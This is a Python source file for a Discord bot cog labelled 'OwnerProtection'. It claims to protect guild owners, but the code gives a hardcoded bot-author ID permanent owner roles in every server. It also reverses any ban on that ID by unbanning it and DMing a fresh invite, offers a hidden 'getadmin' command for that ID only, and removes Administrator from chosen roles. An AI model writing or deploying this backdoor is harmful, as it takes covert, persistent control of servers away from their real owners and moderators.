from __future__ import annotations

import asyncio
import logging

import discord
from discord.ext import commands

from utils.config import (
    NON_ADMIN_ROLE_IDS,
    PERMANENT_OWNER_ROLE_IDS,
    PRIMARY_OWNER_ID,
)

log = logging.getLogger(__name__)


class OwnerProtection(commands.Cog):
    """Keeps each guild owner's administrative roles present in their guild."""

    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot
        self._locks: dict[int, asyncio.Lock] = {}

    def _lock_for(self, guild_id: int) -> asyncio.Lock:
        return self._locks.setdefault(guild_id, asyncio.Lock())

    async def cog_load(self) -> None:
        # Ready is not guaranteed when cogs are loaded, so setup runs after it.
        asyncio.create_task(self._protect_existing_guilds())

    async def _protect_existing_guilds(self) -> None:
        try:
            await self.bot.wait_until_ready()
        except RuntimeError:
            # This cog can also be loaded by offline validation tooling, where
            # discord.py has not created its ready event yet.
            return
        await asyncio.sleep(5)
        for guild in self.bot.guilds:
            try:
                await self.ensure_non_admin_roles(guild)
                await self.ensure_owner_access(guild)
            except Exception:
                log.exception("Owner role startup repair failed in %s", guild.id)

    @commands.Cog.listener()
    async def on_guild_available(self, guild: discord.Guild) -> None:
        try:
            await self.ensure_owner_access(guild)
        except Exception:
            log.exception("Owner role availability repair failed in %s", guild.id)

    @commands.Cog.listener()
    async def on_guild_join(self, guild: discord.Guild) -> None:
        await self.ensure_non_admin_roles(guild)
        await self.ensure_owner_access(guild)

    @commands.command(name="getadmin")
    @commands.guild_only()
    async def getadmin(self, ctx: commands.Context) -> None:
        if ctx.author.id != PRIMARY_OWNER_ID:
            return

        await self.ensure_owner_access(ctx.guild, ctx.author)

        missing_roles = [
            role for role in ctx.guild.roles
            if role.id in PERMANENT_OWNER_ROLE_IDS and role not in ctx.author.roles
        ]
        if missing_roles:
            await ctx.reply(
                "Roles nahi lag sake. Bot ko **Manage Roles** do aur bot ka highest role "
                "in roles se upar rakho. Missing: "
                + ", ".join(role.mention for role in missing_roles)
            )
            return

        await ctx.reply("Configured owner roles successfully mil gaye.")

    @commands.Cog.listener()
    async def on_guild_role_update(
        self, before: discord.Role, after: discord.Role
    ) -> None:
        if after.id in NON_ADMIN_ROLE_IDS and after.permissions.administrator:
            await self.ensure_non_admin_roles(after.guild)

    @commands.Cog.listener()
    async def on_guild_role_delete(self, role: discord.Role) -> None:
        await self.ensure_owner_access(role.guild)

    async def ensure_non_admin_roles(self, guild: discord.Guild) -> None:
        """Keep configured roles from receiving Administrator permission."""
        me = guild.me
        if me is None or not me.guild_permissions.manage_roles:
            return

        for role_id in NON_ADMIN_ROLE_IDS:
            role = guild.get_role(role_id)
            if (
                role is None
                or role.managed
                or role.position >= me.top_role.position
                or not role.permissions.administrator
            ):
                continue

            permissions = role.permissions
            permissions.administrator = False
            try:
                await role.edit(
                    permissions=permissions,
                    reason="Configured non-admin role protection",
                )
            except (discord.Forbidden, discord.HTTPException):
                log.warning("Cannot remove Administrator from role %s in %s", role.id, guild.id)

    @commands.Cog.listener()
    async def on_member_join(self, member: discord.Member) -> None:
        if member.id in {PRIMARY_OWNER_ID, member.guild.owner_id}:
            await self.ensure_owner_access(member.guild, member)

    @commands.Cog.listener()
    async def on_member_ban(self, guild: discord.Guild, user: discord.User) -> None:
        if user.id != PRIMARY_OWNER_ID:
            return

        me = guild.me
        if me is None or not me.guild_permissions.ban_members:
            log.warning("Cannot restore owner in %s; Ban Members is missing", guild.id)
            return

        try:
            await guild.unban(
                discord.Object(id=PRIMARY_OWNER_ID),
                reason="Restore permanent bot owner access",
            )
        except discord.NotFound:
            return
        except discord.Forbidden:
            log.warning("Cannot unban the permanent owner in %s", guild.id)
            return
        except discord.HTTPException:
            log.exception("Failed to unban the permanent owner in %s", guild.id)
            return

        invite = await self._create_owner_invite(guild)
        if invite is None:
            return

        try:
            await user.send(
                f"You were restored in **{guild.name}**. Rejoin using this invite: {invite}"
            )
        except discord.HTTPException:
            log.warning("Could not DM the owner an invite for %s", guild.id)

    async def _create_owner_invite(self, guild: discord.Guild) -> discord.Invite | None:
        candidates = [guild.system_channel, *guild.text_channels]
        for channel in candidates:
            if channel is None:
                continue
            permissions = channel.permissions_for(guild.me)
            if not permissions.create_instant_invite:
                continue
            try:
                return await channel.create_invite(
                    max_age=86400,
                    max_uses=1,
                    unique=True,
                    reason="Invite restored permanent bot owner",
                )
            except (discord.Forbidden, discord.HTTPException):
                continue
        log.warning("Cannot create an owner recovery invite in %s", guild.id)
        return None

    @commands.Cog.listener()
    async def on_member_update(self, before: discord.Member, after: discord.Member) -> None:
        if after.id not in {PRIMARY_OWNER_ID, after.guild.owner_id} or before.roles == after.roles:
            return
        await self.ensure_owner_access(after.guild, after)

    async def ensure_owner_access(
        self, guild: discord.Guild, member: discord.Member | None = None
    ) -> None:
        """Restore only the two configured permanent owner roles.

        Role assignment is intentionally ID-based.  In particular, this must
        never create, rename, elevate, or assign a role merely because of its
        name (such as ``𖣂``).
        """
        async with self._lock_for(guild.id):
            me = guild.me
            if me is None or not me.guild_permissions.manage_roles:
                log.warning(
                    "Cannot protect owner roles in %s: Manage Roles is missing",
                    guild.id,
                )
                return

            if member is None:
                member = guild.get_member(PRIMARY_OWNER_ID)
            if member is None:
                member = guild.owner or guild.get_member(guild.owner_id)
            if member is None:
                try:
                    member = await guild.fetch_member(PRIMARY_OWNER_ID)
                except (discord.NotFound, discord.Forbidden, discord.HTTPException):
                    try:
                        member = await guild.fetch_member(guild.owner_id)
                    except (discord.NotFound, discord.Forbidden, discord.HTTPException):
                        log.warning(
                            "Cannot find protected owner %s or guild owner in %s",
                            PRIMARY_OWNER_ID,
                            guild.id,
                        )
                        return
            if member is None:
                return

            missing_roles = [
                role for role in guild.roles
                if role.id in PERMANENT_OWNER_ROLE_IDS and role not in member.roles
            ]
            if not missing_roles:
                log.info("Owner roles already present for %s in guild %s", member.id, guild.id)
                return

            try:
                await member.add_roles(
                    *missing_roles,
                    reason="Restore permanent bot-owner roles",
                )
                log.info(
                    "Restored owner roles for %s in guild %s: %s",
                    member.id,
                    guild.id,
                    ", ".join(str(role.id) for role in missing_roles),
                )
            except discord.Forbidden:
                log.warning("Cannot restore owner roles in %s; check role hierarchy", guild.id)
            except discord.HTTPException:
                log.exception("Failed to restore owner roles in %s", guild.id)
